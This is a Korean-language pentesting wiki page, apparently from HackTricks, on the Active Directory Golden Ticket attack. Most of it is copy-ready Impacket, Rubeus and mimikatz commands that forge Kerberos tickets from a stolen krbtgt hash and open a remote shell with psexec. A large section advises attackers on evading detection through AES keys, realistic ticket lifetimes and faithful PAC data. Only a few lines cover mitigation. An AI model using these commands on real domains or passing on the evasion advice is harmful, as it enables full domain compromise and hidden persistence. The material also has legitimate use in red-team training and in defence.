# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

**Golden Ticket** 공격은 **Active Directory (AD) krbtgt 계정의 NTLM hash**를 사용해 **임의의 사용자를 가장한 유효한 Ticket Granting Ticket (TGT)를 생성하는 것**으로 이루어진다. 이 기법은 **도메인 내의 어떤 서비스나 머신에도 접근할 수 있게 해주기** 때문에 특히 유리하다. **krbtgt 계정의 자격 증명은 자동으로 갱신되지 않는다**는 점을 반드시 기억해야 한다.

krbtgt 계정의 **NTLM hash를 획득**하기 위해 여러 방법을 사용할 수 있다. 이는 도메인 내의 어떤 Domain Controller (DC) 에서든 **Local Security Authority Subsystem Service (LSASS) 프로세스** 또는 **NT Directory Services (NTDS.dit) 파일**에서 추출할 수 있다. 또한 **DCsync 공격을 수행**하는 것도 이 NTLM hash를 얻는 또 다른 전략이며, **Mimikatz의 lsadump::dcsync module** 또는 **Impacket의 secretsdump.py script** 같은 도구를 사용해 수행할 수 있다. 이러한 작업을 수행하려면 일반적으로 **domain admin 권한 또는 그에 준하는 수준의 접근 권한이 필요하다**는 점을 강조해야 한다.

NTLM hash도 이 목적에 유효한 방법이지만, 운영 보안상 이유로 **Advanced Encryption Standard (AES) Kerberos keys (AES128 and AES256)**를 사용해 ticket을 위조하는 것이 **강력히 권장된다**. 특히 현대 도메인에서는 **RC4 사용이 점차 폐기되고 있으며**, Kerberos telemetry에서 훨씬 더 두드러지게 보이기 때문에 이 점이 더 중요하다.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Modern ticket crafting notes

가능하면, **먼저 LDAP와 SYSVOL를 조회**한 다음 실제 도메인 policy와 user PAC 값을 사용해 ticket을 forge하고, 이를 수동으로 만들어내지 마라:
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap`는 더 현실적인 PAC를 만들기 위해 사용되는 사용자, 그룹, NetBIOS, policy 데이터를 DC에 요청한다.
- `/printcmd`는 가져온 PAC 필드를 포함한 오프라인 command line을 출력하며, 나중에 LDAP에 다시 접촉하지 않고 같은 ticket을 forge하려면 유용하다.
- `/extendedupndns`는 `samAccountName`과 account SID를 포함하는 더 최신 `UpnDns` PAC elements를 추가한다.
- `/oldpac`는 더 최신 `Requestor`와 `Attributes` PAC buffers를 제거한다; 이는 기본 tradecraft보다는 주로 오래된 환경과의 compatibility testing에 유용하다.

Linux에서는 최근 Impacket versions도 더 최신 PAC structures를 추가하고 현실적인 validity period를 설정하는 것을 지원한다:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration`은 **시간** 단위입니다. 기본값은 **10 years**이며, 이는 눈에 띕니다.
- `-extra-pac`는 더 새로운 `UPN_DNS` PAC 정보를 추가합니다.
- `-old-pac`는 legacy PAC layout를 강제로 사용합니다.
- `-extra-sid`는 PAC에 추가 SID가 필요할 때 유용합니다(예: child-to-parent escalation 시나리오, 이는 [SID-History Injection](sid-history-injection.md)에서 다룹니다).

**한번** **golden Ticket**을 주입하면, 공유 파일 **(C$)** 에 접근하고 서비스와 WMI를 실행할 수 있으므로, **psexec** 또는 **wmiexec**를 사용해 shell을 얻을 수 있습니다(보아하니 winrm을 통해서는 shell을 얻을 수 없는 것 같습니다).

### 일반적인 탐지 우회

golden ticket을 탐지하는 가장 흔한 방법은 wire 상의 **Kerberos traffic**을 **분석**하는 것입니다. 기본적으로 Mimikatz는 **TGT에 10 years**를 서명하며, 이는 이후 이 TGT로 만들어진 TGS 요청에서 비정상적으로 눈에 띕니다.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

시작 오프셋, duration, 그리고 최대 renewals를 제어하려면 `/startoffset`, `/endin`, `/renewmax` 파라미터를 사용하세요(모두 분 단위).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
불행히도 TGT의 수명은 4769에 기록되지 않으므로, Windows 이벤트 로그에서는 이 정보를 찾을 수 없습니다. 하지만 상관관계를 볼 수 있는 것은 **사전 4768 없이 4769가 보이는지**입니다. **TGT 없이 TGS를 요청하는 것은 불가능**하며, TGT가 발급된 기록이 없다면 그것이 오프라인에서 위조되었다고 추론할 수 있습니다.

**더 최신 Windows 빌드**에서는 Event ID **4768**과 **4769**가 훨씬 더 나은 **encryption type telemetry**도 제공합니다. `krbtgt`, 클라이언트, 서비스가 이미 AES 키를 가지고 있는 도메인에서 **RC4 (`0x17`)**를 사용하는 위조 TGT/TGS는 몇 년 전보다 훨씬 쉽게 탐지할 수 있습니다. 이것은 **AES-backed Golden Tickets**를 선호해야 하고, 도메인의 일반적인 Kerberos 정책에 최대한 가깝게 맞춰야 하는 또 하나의 이유입니다.

또 다른 OPSEC 문제는 **PAC fidelity**입니다. 불가능한 그룹 멤버십, 최신 PAC buffer 누락, 또는 LDAP와 일치하지 않는 계정 메타데이터를 가진 티켓은 방어자가 PAC 내용을 AD 데이터와 대조 검증할 때 더 쉽게 탐지됩니다. DC가 실제로 발급한 것처럼 보이는 TGT가 필요하다면, 다음을 검토하세요:

{{#ref}}
diamond-ticket.md
{{#endref}}

지속성에는 **환경적 제한**도 있습니다. `krbtgt` 계정은 **2개의 password history**를 유지하므로, 위조된 TGT가 이전 키로 서명되었다면 **첫 번째** `krbtgt` reset 이후에도 유효한 상태로 남을 수 있습니다. 이것이 방어자가 **`krbtgt`를 두 번 reset**하고, 각 reset 사이에 도메인의 최대 ticket lifetime 이상을 기다려 Golden Ticket을 무효화하는 이유입니다.

이 탐지를 **우회**하려면 diamond tickets를 확인하세요.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

방어자가 할 수 있는 다른 작은 기법은 default domain administrator account 같은 민감한 사용자의 **4769 알림**을 설정하고, 일반적으로 AES tickets를 발급하는 도메인에서 `krbtgt`에 대한 **RC4 사용**을 알리는 것입니다.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
